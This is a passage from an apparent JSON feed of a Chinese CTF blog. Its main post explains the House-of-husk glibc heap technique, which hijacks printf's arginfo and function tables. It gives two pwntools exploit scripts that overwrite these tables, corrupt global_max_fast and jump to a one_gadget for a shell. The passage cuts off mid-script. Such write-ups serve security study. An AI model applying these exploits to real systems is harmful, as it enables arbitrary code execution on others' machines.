punctuation\">)</span><span class=\"token punctuation\">(</span>__printf_function_table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点2</span>\n\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"114514\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>",
            "tags": [
                "CTF",
                "PWN"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/",
            "url": "http://niyah.cn/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/",
            "title": "House-of-husk学习",
            "date_published": "2022-01-25T16:00:00.000Z",
            "content_html": "<p>新姿势</p>\n<a id=\"more\"></a>\n<h1 id=\"house-of-husk学习\"><a class=\"markdownIt-Anchor\" href=\"#house-of-husk学习\">#</a> House-of-husk 学习</h1>\n<h2 id=\"利用原理\"><a class=\"markdownIt-Anchor\" href=\"#利用原理\">#</a> 利用原理</h2>\n<p>参考链接：<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458392560&amp;idx=1&amp;sn=73533c60d701ad5816545520bc889135&amp;chksm=b18f277a86f8ae6ce880fd532b70bbbb70180859299f7476bd1d3033a43ea7e0b3fb6709c460&amp;mpshare=1&amp;scene=23&amp;srcid=0916yGLvaaM3pZ9PY81C5D8W&amp;sharer_sharetime=1631793106745&amp;sharer_shareid=a934676a75a04c6ea85c1e3e4f6123af#rd\">高 Glibc 版本下的堆骚操作解析</a></p>\n<p>利用了 <code>printf</code>  的一个调用链</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">printf<span class=\"token operator\">-></span>vfprintf<span class=\"token operator\">-></span>printf_positional<span class=\"token operator\">-></span>__parse_one_specmb<span class=\"token operator\">-></span><span class=\"token function\">__printf_arginfo_table</span><span class=\"token punctuation\">(</span>spec<span class=\"token punctuation\">)</span> </code></pre>\n<p>_parse_one_specmb 函数会调用 __printf_arginfo_table 和__printf_function_table 两个函数指针中对应 spec 索引的函数指针 printf_arginfo_size_function</p>\n<blockquote>\n<p>这个 spec 索引指针就是格式化字符的 ascii 码值，比如 printf (&quot;% s&quot;)，那么就是 s 的 ascii 码值。</p>\n</blockquote>\n<p>即调用 (__printf_arginfo_table+'spec’8) 和 (printf_function_table+'spec’8) 这两个函数指针。</p>\n<p>实际情况会先调用__printf_arginfo_table 中对应的 spec 索引的函数指针</p>\n<h2 id=\"利用条件\"><a class=\"markdownIt-Anchor\" href=\"#利用条件\">#</a> 利用条件</h2>\n<p>调用的前提便是__printf_arginfo_table 和__printf_function_table 均不为 0，当然大前提是程序要有 printf 和格式化字符串参数</p>\n<blockquote>\n<ul>\n<li>__printf_function_table != 0</li>\n<li>__printf_arginfo_table = heap_addr</li>\n<li>heap_addr+‘spec’*8 = one_gadget</li>\n</ul>\n<p><strong>其中 heap_addr 可以为任何可控地址</strong></p>\n</blockquote>\n<p>如果我们可以将可控的地址写到 __printf_arginfo_table 和 __printf_function_table 便可以进行利用，如 large bin attack 写入堆地址</p>\n<h2 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题</h2>\n<h3 id=\"readme_revenge\"><a class=\"markdownIt-Anchor\" href=\"#readme_revenge\">#</a> readme_revenge</h3>\n<p>首先是对 name 进行输入，其中 name 存在于 bss 段</p>\n<p><img src=\"/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/image-20220126185959019.png\" alt=\"image-20220126185959019\"></p>\n<p>那么我们可以直接从 bss 段溢出覆盖各种我们需要的条件</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./readme_revenge'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    flag_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B4040</span>\n    name_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B73E0</span>\n    argv_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006b7980</span>\n\n    __printf_function_table_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B7A28</span>\n    __printf_arginfo_table_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B7AA8</span>\n    <span class=\"token comment\"># 由于是静态连接，这两个地址可以自己去 printf 函数中去找</span>\n    \n    stack_chk_fail <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004359b0</span>\n    \n    payload  <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x73</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>stack_chk_fail<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置要执行的函数</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>argv_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> name_addr <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置 argv[0] 即程序名地址为 flag 的地址、</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>__printf_function_table_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>__printf_arginfo_table_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> name_addr <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置要执行的函数地址 （需要算好偏移）</span>\n\n    <span class=\"token comment\"># 本题输入在bss段，可以将下面的东西全部覆盖到</span>\n    sl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   readme_revenge.py\n@Time    :   2022/01/26 18:11:40\n@Author  :   Niyah \n'''</span></code></pre>\n<h3 id=\"送分题\"><a class=\"markdownIt-Anchor\" href=\"#送分题\">#</a> 送分题</h3>\n<p>本题逻辑很清晰，且可以申请两个特别大的块，并且有个 uaf 可以对 unsorted bin 进行修改，我们泄露出 libc 地址后直接攻击 global_max_fast 让特别大的块也属于 fast bin 随后释放两个大块的时候就会把这两个大块的地址写到 main_arena 附近，如果我们控制好堆块大小，可以直接写到 __printf_arginfo_table 和 __printf_function_table</p>\n<p>此时让__printf_arginfo_table 处指向的这个堆块的合适位置为一个函数指针，便可以在 printf 的时候调用这个函数从而 getshell</p>\n<p><img src=\"/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/1.png\" alt=\"1\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./sftpwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    __printf_arginfo_table <span class=\"token operator\">=</span> <span class=\"token number\">0x3ec870</span>\n    __printf_function_table <span class=\"token operator\">=</span> <span class=\"token number\">0x3f0658</span>\n    main_arena <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span> \n\n    size1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__printf_arginfo_table <span class=\"token operator\">-</span> main_arena<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span>\n    size2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__printf_function_table <span class=\"token operator\">-</span> main_arena<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span>\n    <span class=\"token comment\"># 算好 size ，让其 free 时刚好在 __printf_arginfo_table 和 __printf_function_table</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'size1'</span><span class=\"token punctuation\">,</span>size1<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'size2'</span><span class=\"token punctuation\">,</span>size2<span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'big box, what size?'</span> <span class=\"token punctuation\">,</span> size1<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'bigger box, what size?'</span> <span class=\"token punctuation\">,</span> size2<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'rename?(y/n)'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">)</span>\n\n    __malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n    global_max_fast <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x3ed940</span>\n    ogg <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x10a45c</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'global_max_fast'</span><span class=\"token punctuation\">,</span>global_max_fast<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'ogg'</span><span class=\"token punctuation\">,</span>ogg<span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span>global_max_fast <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> global_max_fast <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'(1:big/2:bigger)'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x73</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\n    <span class=\"token comment\"># q：为什么要 -2 ？</span>\n    <span class=\"token comment\"># a：因为堆块头部包含了 